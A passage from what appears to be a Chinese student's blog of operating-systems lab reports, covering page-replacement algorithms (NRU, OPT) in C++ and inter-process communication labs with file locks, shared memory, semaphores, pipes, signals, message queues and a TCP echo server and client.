_pFreepf_head-&gt;m_pNext=<span class="literal">NULL</span>;</span><br><span class="line">    			}</span><br><span class="line">			_vDiscPages[_vPage[i]].m_nPageFaceNumber=_pFreepf_head-&gt;m_nPageFaceNumber;</span><br><span class="line">  			_pFreepf_head=_pFreepf_head-&gt;m_pNext;</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">  			_vDiscPages[_vPage[i]].m_nCounter=<span class="number">1</span>;</span><br><span class="line">    		<span class="keyword">if</span>(i%CLEAR_PERIOD==<span class="number">0</span>)</span><br><span class="line">				<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;TOTAL_VP;j++)</span><br><span class="line">					_vDiscPages[j].m_nCounter=<span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"> 	cout&lt;&lt;<span class="string">"NRU:"</span>&lt;&lt;<span class="number">1</span>-(<span class="type">float</span>)_nDiseffect/<span class="number">320</span>&lt;&lt;<span class="string">"\t"</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<div class="note success"><p>易于理解，容易实现。</p>
</div></div><div class="tab-pane" id="algs-4"><ol>
<li>初始化。设置两个数组 <code>page[ap]</code> 和 <code>pagecontrol[pp]</code> 分别表示进程页面数和内存分配的页面数，并产生一个的随机数序列 <code>main[total_instruction]</code>（当然这个序列由 <code>page[]</code><br>
的下标随机构成），表示待处理的进程页面顺序，<code>diseffect</code> 置 0。然后扫描整个页面访问序列，对 <code>vDistance[TOTAL_VP]</code> 数组进行赋值，表示该页面将在第几步被处理。</li>
<li>看 <code>main[]</code> 中是否有下一个元素，有就从 <code>main[]</code> 中获取一个 CPU 待处理的页面号；没有，就转到 6。</li>
<li>如果该 <code>page</code> 页已在内存中，就转到 2；否则就到 4，同时未命中的 <code>diseffect</code> 加 1。</li>
<li>看是否有空闲的内存页面。如果有，就直接返回该页面指针。如果没有，遍历所有未处理的进程页面序列，如果有位于内存中的页面，而以后 CPU 不再处理，首先将其换出，返回页面指针；如果没有这样的页面，找出 CPU 最晚处理到的页面，将其换出，返回该内存页面指针。</li>
<li>在内存页面和待处理的进程页面之间建立联系，返回 2。</li>
<li>输出命中率，算法结束。（命中率在扫描时完成计算）</li>
</ol>
<div class="note info"><p>从以上算法描述中，可以看出，OPT 是一种理想化的算法，因为操作系统中页面处理顺序是不一定的，所以页面将在哪一步被处理是不可预测的。但是，可以以此为标准来评价其他页面置换算法。</p>
</div>
<pre class="mermaid">graph TD
A(["初始化"]) --&gt; B{"main[] 中是否有下一个元素"} B --&gt; |Y|C["由main获取下一个元素页面下标"]
B --&gt; |N|D(["显示命中率，算法完成"])
C --&gt; E{"该页是否在内存中"} E --&gt; |Y|B E --&gt; |N|F["diseffect++"]
F --&gt; G{是否有空闲页面} G --&gt; |Y|H["返回该页面指针"]
G --&gt; |N|I["遍历所有未处理的进程页面序列"]
I --&gt; J{"存在位于内存中的页面，而以后CPU不再处理"} J --&gt; |Y|K[将其换出]
J --&gt; |N|L[找出CPU最晚处理到的页面]
L --&gt; K K --&gt; H H --&gt; M[内存页面和待处理的进程页面建立关系]
M --&gt; B
</pre>
<figure class="highlight c++"><figcaption><span>OPT 算法 </span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMemory::OPT</span><span class="params">(<span class="type">const</span> <span class="type">int</span> nTotal_pf)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"> 	<span class="type">int</span> i,j,max,maxpage,nDistance,vDistance[TOTAL_VP];</span><br><span class="line">  	<span class="built_in">initialize</span>(nTotal_pf);</span><br><span class="line">  	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;TOTAL_INSTRUCTION;i++)    {</span><br><span class="line">    		<span class="keyword">if</span>(_vDiscPages[_vPage[i]].m_nPageFaceNumber==INVALID){</span><br><span class="line">			_nDiseffect++;</span><br><span class="line">	  		<span class="keyword">if</span>(_pFreepf_head==<span class="literal">NULL</span>)	    {</span><br><span class="line">	     			<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;TOTAL_VP;j++)</span><br><span class="line">           				<span class="keyword">if</span>(_vDiscPages[j].m_nPageFaceNumber!=INVALID)</span><br><span class="line">						vDistance[j]=<span class="number">32767</span>;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">		      			vDistance[j]=<span class="number">0</span>;</span><br><span class="line">				nDistance=<span class="number">1</span>;</span><br><span class="line">  				<span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;TOTAL_INSTRUCTION;j++)		{</span><br><span class="line">      				<span class="keyword">if</span>((_vDiscPages[_vPage[j]].m_nPageFaceNumber!=INVALID)&amp;&amp;(vDistance[_vPage[j]]==<span class="number">32767</span>))</span><br><span class="line">        				vDistance[_vPage[j]]=nDistance;</span><br><span class="line">     				nDistance++;</span><br><span class="line">				}</span><br><span class="line">    			max=<span class="number">-1</span>;</span><br><span class="line">    			<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;TOTAL_VP;j++)</span><br><span class="line">				<span class="keyword">if</span>(max&lt;vDistance[j]){</span><br><span class="line">    					max=vDistance[j];</span><br><span class="line">    					maxpage=j;</span><br><span class="line">				}</span><br><span class="line">			_pFreepf_head=&amp;_vMemoryPages[_vDiscPages[maxpage].m_nPageFaceNumber];</span><br><span class="line">    			_pFreepf_head-&gt;m_pNext=<span class="literal">NULL</span>;</span><br><span class="line">    			_vDiscPages[maxpage].m_nPageFaceNumber=INVALID;</span><br><span class="line">  			}</span><br><span class="line">		_vDiscPages[_vPage[i]].m_nPageFaceNumber=_pFreepf_head-&gt;m_nPageFaceNumber;</span><br><span class="line">	  	_pFreepf_head=_pFreepf_head-&gt;m_pNext;</span><br><span class="line">		}</span><br><span class="line">   	}</span><br><span class="line"> 	cout&lt;&lt;<span class="string">"OPT:"</span>&lt;&lt;<span class="number">1</span>-(<span class="type">float</span>)_nDiseffect/<span class="number">320</span>&lt;&lt;<span class="string">"\t"</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div></div></div>
<h2 id="实验关键里程碑数据与结果">实验关键里程碑数据与结果</h2>
<p>用 g++ 编译 <code>kernel.cpp</code>，运行截图如下 <img data-src="/2019/10/27/experiments/oskernel/page-management/run.png" class=""></p>
<p>可以看到，随着页面数的增多，FIFO、LRU、NRU 三种算法的命中率无限趋近于 OPT 算法，且每一种算法的命中率都在单调上升。（第三列输出写错成 NUR 了）</p>
<h2 id="实验难点与收获">实验难点与收获</h2>
<p>这次实验仍然是编程，主要是使用了 C++ 语言，借助类和结构体实现了常见的页面置换算法。实现过程中主要的困难是将算法语言表示转化为代码语言，需要考虑的东西有很多。通过对于实验结果的观察，我对于页面置换算法有了更加直观的理解，了解到其随所处理页面数的增加，命中率也在增加，FIFO、LRU、NRU 三种算法各有利弊，总体来说，它们都是操作系统中较为常用的页面置换算法。</p>
<h2 id="实验思考">实验思考</h2>
<p>其实这个实验只是模拟了页面比较少的时候，几种页面置换算法的准确率变化，页面置换的顺序也都是随机生成的序列。实际上，我们的操作系统所要操作的页面情况远比模拟情况要复杂，命中率的上升可能也不会是单调的。</p>
<p>如果在输出中加上每次生成的操作序列和每次换入换出的情况的话，就会更加直观了，准确率从何而来也能看得更加清楚了。</p>
]]></content>
      <categories>
        <category>实验</category>
        <category>技术</category>
        <category>OS</category>
        <category>操作系统内核</category>
        <category>页面调度</category>
      </categories>
      <tags>
        <tag>OS</tag>
        <tag>页面调度</tag>
      </tags>
  </entry>
  <entry>
    <title>进程通信实验</title>
    <url>/2019/11/24/experiments/oskernel/process-communication/</url>
    <content><![CDATA[<h2 id="实验目的">实验目的</h2>
<p>通过几则进程通信的例子，理解进程的同步机制，理解锁、信号量在同步编程的重要地位。</p>
<span id="more"></span>
<h2 id="步骤">步骤</h2>
<ol>
<li>解压给定程序包得到代码文件 <img data-src="/2019/11/24/experiments/oskernel/process-communication/1.png" class=""></li>
<li>运行 Makefile 编译所有代码文件 <img data-src="/2019/11/24/experiments/oskernel/process-communication/2.png" class=""></li>
<li>依次运行每个目标文件，观察它的执行现象</li>
</ol>
<h2 id="实验关键里程碑数据与结果">实验关键里程碑数据与结果</h2>
<h3 id="文件共享实验-consumer-producer">文件共享实验 (consumer &amp; producer)</h3>
<p>通过阅读源码得知，consumer 和 producer 共用了一个 <code>data.dat</code> 文件，其中 producer 向其写入内容</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">write(fd, DataString, <span class="built_in">strlen</span>(DataString)); <span class="comment">/* populate data file */</span></span><br></pre></td></tr></tbody></table></figure>
<p>其中 DataString 是我们写入的文字内容。 consumer 从中读出内容并写入到标准输出 <code>stdout</code> 中</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* Read the bytes (they happen to be ASCII codes) one at a time. */</span></span><br><span class="line"><span class="type">int</span> c; <span class="comment">/* buffer for read bytes */</span></span><br><span class="line"><span class="keyword">while</span> (read(fd, &amp;c, <span class="number">1</span>) &gt; <span class="number">0</span>)    <span class="comment">/* 0 signals EOF */</span></span><br><span class="line">write(STDOUT_FILENO, &amp;c, <span class="number">1</span>); <span class="comment">/* write one byte to the standard output */</span></span><br></pre></td></tr></tbody></table></figure>
<p>为了增强理解，我将 DataString 修改为了 “2017****** xxx (名字和学号已打码)”，<code>data.dat</code> 中的原来内容做如下修改</p>
<img data-src="/2019/11/24/experiments/oskernel/process-communication/3.png" class="">
<p>然后重新编译程序。</p>
<p>接下来，先运行 consumer，以验证 <code>data.dat</code> 中的内容未修改。运行一次 producer，我们的 datastring 被写入到 <code>data.dat</code> 中，由于 producer 指定了开始指针为 0（文件中的第一个字节），所以我们的字符串从第一个字节开始，修改了原来 data.dat 中的内容，再调用 consumer，就会显示此时文件的内容已被我们修改。</p>
<img data-src="/2019/11/24/experiments/oskernel/process-communication/4.png" class="">
<div class="note info"><p>看上去是简单的文件写入和读取操作，实际上还有一些额外的工作</p>
<div class="tabs" id="extra"><ul class="nav-tabs"><li class="tab active"><a href="#extra-1"><code>producer.c</code></a></li><li class="tab"><a href="#extra-2"><code>consumer.c</code></a></li></ul><div class="tab-content"><div class="tab-pane active" id="extra-1"><p>首先设定读 / 写锁。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">flock</span> <span class="title">lock</span>;</span></span><br><span class="line">lock.l_type = F_WRLCK;    <span class="comment">/* read/write (exclusive versus shared) lock */</span></span><br></pre></td></tr></tbody></table></figure>
<p>然后试图打开文件。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((fd = open(FileName, O_RDWR | O_CREAT, <span class="number">0666</span>)) &lt; <span class="number">0</span>)  <span class="comment">/* -1 signals an error */</span></span><br><span class="line">report_and_exit(<span class="string">"open failed..."</span>);</span><br></pre></td></tr></tbody></table></figure>
<p>并为它加锁（不阻塞）。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fcntl(fd, F_SETLK, &amp;lock) &lt; <span class="number">0</span>) <span class="comment">/** F_SETLK doesn't block, F_SETLKW does **/</span></span><br><span class="line">report_and_exit(<span class="string">"fcntl failed to get lock..."</span>);</span><br></pre></td></tr></tbody></table></figure>
<p>在文件写入结束后，释放锁。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">lock.l_type = F_UNLCK;</span><br><span class="line"><span class="keyword">if</span> (fcntl(fd, F_SETLK, &amp;lock) &lt; <span class="number">0</span>)</span><br><span class="line">report_and_exit(<span class="string">"explicit unlocking failed..."</span>);</span><br></pre></td></tr></tbody></table></figure></div><div class="tab-pane" id="extra-2"><p>在 <code>consumer.c</code> 中，锁的类型仍然是读 / 写锁。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">flock</span> <span class="title">lock</span>;</span></span><br><span class="line">lock.l_type = F_WRLCK;    <span class="comment">/* read/write (exclusive) lock */</span></span><br></pre></td></tr></tbody></table></figure>
<p>然后试图打开文件。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((fd = open(FileName, O_RDONLY)) &lt; <span class="number">0</span>)  <span class="comment">/* -1 signals an error */</span></span><br><span class="line">report_and_exit(<span class="string">"open to read failed..."</span>);</span><br></pre></td></tr></tbody></table></figure>
<p>文件被加写锁时，不能从中读出内容。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* If the file is write-locked, we can't continue. */</span></span><br><span class="line">fcntl(fd, F_GETLK, &amp;lock); <span class="comment">/* sets lock.l_type to F_UNLCK if no write lock */</span></span><br><span class="line"><span class="keyword">if</span> (lock.l_type != F_UNLCK)</span><br><span class="line">report_and_exit(<span class="string">"file is still write locked..."</span>);</span><br></pre></td></tr></tbody></table></figure>
<p>读出内容时，要加读锁。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">lock.l_type = F_RDLCK; <span class="comment">/* prevents any writing during the reading */</span></span><br><span class="line"><span class="keyword">if</span> (fcntl(fd, F_SETLK, &amp;lock) &lt; <span class="number">0</span>)</span><br><span class="line">report_and_exit(<span class="string">"can't get a read-only lock..."</span>);</span><br></pre></td></tr></tbody></table></figure>
<p>读出结束后，释放锁。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* Release the lock explicitly. */</span></span><br><span class="line">lock.l_type = F_UNLCK;</span><br><span class="line"><span class="keyword">if</span> (fcntl(fd, F_SETLK, &amp;lock) &lt; <span class="number">0</span>)</span><br><span class="line">report_and_exit(<span class="string">"explicit unlocking failed..."</span>);</span><br></pre></td></tr></tbody></table></figure>
<p>手动释放锁即使失败，<code>close(fd)</code> 和 <code>return 0</code> 也可以释放掉进程。</p></div></div></div></div>
<h3 id="内存共享实验-memwriter-memreader">内存共享实验 (memwriter &amp; memreader)</h3>
<p>通过源码得知，memwriter 和 memreader 共用了 <code>/dev/shm</code> 内的一块空间，由 writer 向其中写入内容，reader 向外读出并写入 <code>stdout</code> 中。 <img data-src="/2019/11/24/experiments/oskernel/process-communication/5.png" class=""></p>
<p>在 memwriter 启动的一瞬间，<code>/dev/shm/</code> 下会多出一个叫 <code>shMemEx</code> 的文件，写入的内容就暂存在那个文件里。读出时也从那个文件中读出内容。Memwriter 和 memreader 的正确工作要依靠计数信号量（semaphore），具体来说：</p>
<ol>
<li>
<p>memwriter 中，<code>semptr</code> 的初始值为 0，如果 <code>semptr</code> 的值为 - 1，那么程序退出。</p>
 <figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* semphore code to lock the shared mem */</span></span><br><span class="line"><span class="type">sem_t</span>* semptr = sem_open(SemaphoreName, <span class="comment">/* name */</span></span><br><span class="line">		   O_CREAT,       <span class="comment">/* create the semaphore */</span></span><br><span class="line">		   AccessPerms,   <span class="comment">/* protection perms */</span></span><br><span class="line">		   <span class="number">0</span>);            <span class="comment">/* initial value */</span></span><br><span class="line"><span class="keyword">if</span> (semptr == (<span class="type">void</span>*) <span class="number">-1</span>) report_and_exit(<span class="string">"sem_open"</span>);</span><br></pre></td></tr></tbody></table></figure>
<p>在 <code>strcpy</code> 将 <code>contents</code> 拷贝到内存后，<code>sem_post</code> 增加信号量的值（+1），如果 <code>semptr</code> 的值还是 - 1，那么程序退出。</p>
 <figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* increment the semaphore so that memreader can read */</span></span><br><span class="line"><span class="keyword">if</span> (sem_post(semptr) &lt; <span class="number">0</span>) report_and_exit(<span class="string">"sem_post"</span>);</span><br></pre></td></tr></tbody></table></figure>
</li>
<li>
<p>memreader 中，<code>semptr</code> 的初始值还是 0。当 <code>semptr</code> 不为 0 时，将 <code>memcontents</code> 的内容全部逐字读出。每次 <code>sem_wait</code> 都将使信号量的值 - 1。</p>
 <figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* use semaphore as a mutex (lock) by waiting for writer to increment it */</span></span><br><span class="line"><span class="keyword">if</span> (!sem_wait(semptr)) { <span class="comment">/* wait until semaphore != 0 */</span></span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(MemContents); i++)</span><br><span class="line">	  write(STDOUT_FILENO, memptr + i, <span class="number">1</span>); <span class="comment">/* one byte at a time */</span></span><br><span class="line">	sem_post(semptr);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
</li>
</ol>
<h3 id="管道通信实验-fifoWriter-fifoReader">管道通信实验 (fifoWriter &amp; fifoReader)</h3>
<p>fifoWriter 和 fifoReader 共享了一个管道文件 <code>fifoChannel</code>，fifoWriter 向其中写入若干随机数，fifoReader 读文件并判断其中质数的多少。</p>
<img data-src="/2019/11/24/experiments/oskernel/process-communication/6.png" class="">
<p>与实验 3.2 不同的是，当同时运行此实验的 writer 和 reader 时，一定是 writer 先结束后，Reader 才会有结果显示。当事先没有 writer 的写入时，reader 会直接退出（因为没有管道文件）。运行一瞬间产生的管道文件会在写入完成后消失（源代码中写完就 <code>close</code> 了）。</p>
<p>写进程以只写模式打开管道文件。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> fd = open(pipeName, O_CREAT | O_WRONLY); <span class="comment">/* open as write-only */</span></span><br></pre></td></tr></tbody></table></figure>
<p>读进程以只读模式打开管道文件。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> fd = open(file, O_RDONLY);</span><br></pre></td></tr></tbody></table></figure>
<p>从而分时占用了文件。</p>
<h3 id="信号量互斥实验-shutdown">信号量互斥实验 (shutdown)</h3>
<p>运行结果如下</p>
<img data-src="/2019/11/24/experiments/oskernel/process-communication/7.png" class="">
<div class="note info"><h4 id="这是啥意思呢？">这是啥意思呢？</h4>
<p>结合源码得知，主进程运行到 <code>fork</code> 后分开为两个进程，父进程调用 <code>parent_code</code> 并阻塞，调用 <code>sleep(5)</code> 睡眠 5 秒，等待子进程退出。(这可以解释为什么 main 打印了一遍，而 main…2 和 main…3 被打印了两遍的原因 ——main…2 和 main…3 都在 fork 调用之后) 然后，子进程从 <code>fork</code> 开始继续运行，进入了 <code>child_code</code>，<code>child_code</code> 中，注册了 <code>SIGTERM</code>（id=15）为其处理信号。然后，尝试先调用 <code>sleep(1)</code>，睡眠 1 秒，然后输出 "Child just woke up, but going back to sleep"。5 秒过后主进程醒了，继续运行 <code>parent_code</code>，其调用了 <code>kill</code> 来杀死子进程，（所以上述信息输出了 4 次）子进程接收到信号后，打印出信号 id 并执行相应的处理函数。待子进程调用<code>_exit(0)</code> 返回内核后，父进程也退出，整个程序运行结束。</p>
</div>
<h3 id="队列通信实验-sender-receiver">队列通信实验 (sender &amp; receiver)</h3>
<p>通过观察源码得知，此部分实验运用了消息队列函数 <code>msgget</code>、<code>msgsnd</code>、<code>msgrcv</code>、<code>msgctl</code>，它们所需要的头文件为 <code>&lt;sys/types.h&gt;</code>、<code>&lt;sys/ipc.h&gt;</code> 和 <code>&lt;sys/msg.h&gt;</code>。sender 以队列形式发出了六条信息 "msg1"、 “msg2”、 “msg3”、 “msg4”、 “msg5”、 “msg6”，msg1 和 2 是类型 1 的，3 和 4 是类型 2 的，5 和 6 是类型 3 的。Receiver 以与发送方不同的类型顺序接收，具体来说，按照 3→1→2→1→3→2 的顺序，实际运行结果如下</p>
<img data-src="/2019/11/24/experiments/oskernel/process-communication/8.png" class="">
<p>仍然可以正确地接收信息，而且队列内部的顺序是 “先来先接收” 的。比如 msg1 在 type1 中先于 msg2 发送，那么接收时也是 msg1 比 msg2 先接送。</p>
<p>当 msg 接收完成后，它就从队列中被移除，这也是为什么再次运行 receiver 后接受失败的原因。</p>
<img data-src="/2019/11/24/experiments/oskernel/process-communication/9.png" class="">
<h3 id="实现内核和用户程序之间的文件通信">实现内核和用户程序之间的文件通信</h3>
<div class="tabs" id="code"><ul class="nav-tabs"><li class="tab active"><a href="#code-1"><i class="fa fa-code"></i>server 源码</a></li><li class="tab"><a href="#code-2"><i class="fa fa-code"></i>client 源码</a></li></ul><div class="tab-content"><div class="tab-pane active" id="code-1"><figure class="highlight c"><figcaption><span>server.c</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"sock.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">report</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg, <span class="type">int</span> <span class="built_in">terminate</span>)</span> {</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">terminate</span>) <span class="built_in">exit</span>(<span class="number">-1</span>); <span class="comment">/* failure */</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">  <span class="type">int</span> fd = socket(AF_INET,     <span class="comment">/* network versus AF_LOCAL */</span></span><br><span class="line">		  SOCK_STREAM, <span class="comment">/* reliable, bidirectional: TCP */</span></span><br><span class="line">		  <span class="number">0</span>);          <span class="comment">/* system picks underlying protocol */</span></span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) report(<span class="string">"socket"</span>, <span class="number">1</span>); <span class="comment">/* terminate */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* bind the server's local address in memory */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;saddr, <span class="number">0</span>, <span class="keyword">sizeof</span>(saddr));          <span class="comment">/* clear the bytes */</span></span><br><span class="line">  saddr.sin_family = AF_INET;                <span class="comment">/* versus AF_LOCAL */</span></span><br><span class="line">  saddr.sin_addr.s_addr = htonl(INADDR_ANY); <span class="comment">/* host-to-network endian */</span></span><br><span class="line">  saddr.sin_port = htons(PortNumber);        <span class="comment">/* for listening */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (bind(fd, (<span class="keyword">struct</span> sockaddr *) &amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)</span><br><span class="line">    report(<span class="string">"bind"</span>, <span class="number">1</span>); <span class="comment">/* terminate */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* listen to the socket */</span></span><br><span class="line">  <span class="keyword">if</span> (listen(fd, MaxConnects) &lt; <span class="number">0</span>) <span class="comment">/* listen for clients, up to MaxConnects */</span></span><br><span class="line">    report(<span class="string">"listen"</span>, <span class="number">1</span>); <span class="comment">/* terminate */</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Listening on port %i for clients...\n"</span>, PortNumber);</span><br><span class="line">  <span class="comment">/* a server traditionally listens indefinitely */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) {</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">caddr</span>;</span> <span class="comment">/* client address */</span></span><br><span class="line">    <span class="type">int</span> len = <span class="keyword">sizeof</span>(caddr);  <span class="comment">/* address length could change */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> client_fd = accept(fd, (<span class="keyword">struct</span> sockaddr*) &amp;caddr, &amp;len);  <span class="comment">/* accept blocks */</span></span><br><span class="line">    <span class="keyword">if</span> (client_fd &lt; <span class="number">0</span>) {</span><br><span class="line">      report(<span class="string">"accept"</span>, <span class="number">0</span>); <span class="comment">/* don't terminated, though there's a problem */</span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read from client */</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ConversationLen; i++) {</span><br><span class="line">      <span class="type">char</span> buffer[BuffSize + <span class="number">1</span>];</span><br><span class="line">      <span class="built_in">memset</span>(buffer, <span class="string">'\0'</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">      <span class="type">int</span> count = read(client_fd, buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">0</span>) {</span><br><span class="line">	<span class="built_in">puts</span>(buffer);</span><br><span class="line">	write(client_fd, buffer, <span class="keyword">sizeof</span>(buffer)); <span class="comment">/* echo as confirmation */</span></span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    close(client_fd); <span class="comment">/* break connection */</span></span><br><span class="line">  }  <span class="comment">/* while(1) */</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><div class="tab-pane" id="code-2"><figure class="highlight c"><figcaption><span>client.c</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"sock.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* books[] = {<span class="string">"War and Peace"</span>,</span><br><span class="line">		       <span class="string">"Pride and Prejudice"</span>,</span><br><span class="line">		       <span class="string">"The Sound and the Fury"</span>};</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">report</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg, <span class="type">int</span> <span class="built_in">terminate</span>)</span> {</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">terminate</span>) <span class="built_in">exit</span>(<span class="number">-1</span>); <span class="comment">/* failure */</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">  <span class="comment">/* fd for the socket */</span></span><br><span class="line">  <span class="type">int</span> sockfd = socket(AF_INET,      <span class="comment">/* versus AF_LOCAL */</span></span><br><span class="line">		      SOCK_STREAM,  <span class="comment">/* reliable, bidirectional */</span></span><br><span class="line">		      <span class="number">0</span>);           <span class="comment">/* system picks protocol (TCP) */</span></span><br><span class="line">  <span class="keyword">if</span> (sockfd &lt; <span class="number">0</span>) report(<span class="string">"socket"</span>, <span class="number">1</span>); <span class="comment">/* terminate */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* get the address of the host */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">hostent</span>* <span class="title">hptr</span> =</span> gethostbyname(Host); <span class="comment">/* localhost: 127.0.0.1 */</span></span><br><span class="line">  <span class="keyword">if</span> (!hptr) report(<span class="string">"gethostbyname"</span>, <span class="number">1</span>); <span class="comment">/* is hptr NULL? */</span></span><br><span class="line">  <span class="keyword">if</span> (hptr-&gt;h_addrtype != AF_INET)       <span class="comment">/* versus AF_LOCAL */</span></span><br><span class="line">    report(<span class="string">"bad address family"</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* connect to the server: configure server's address 1st */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>;</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;saddr, <span class="number">0</span>, <span class="keyword">sizeof</span>(saddr));</span><br><span class="line">  saddr.sin_family = AF_INET;</span><br><span class="line">  saddr.sin_addr.s_addr =</span><br><span class="line">     ((<span class="keyword">struct</span> in_addr*) hptr-&gt;h_addr_list[<span class="number">0</span>])-&gt;s_addr;</span><br><span class="line">  saddr.sin_port = htons(PortNumber); <span class="comment">/* port number in 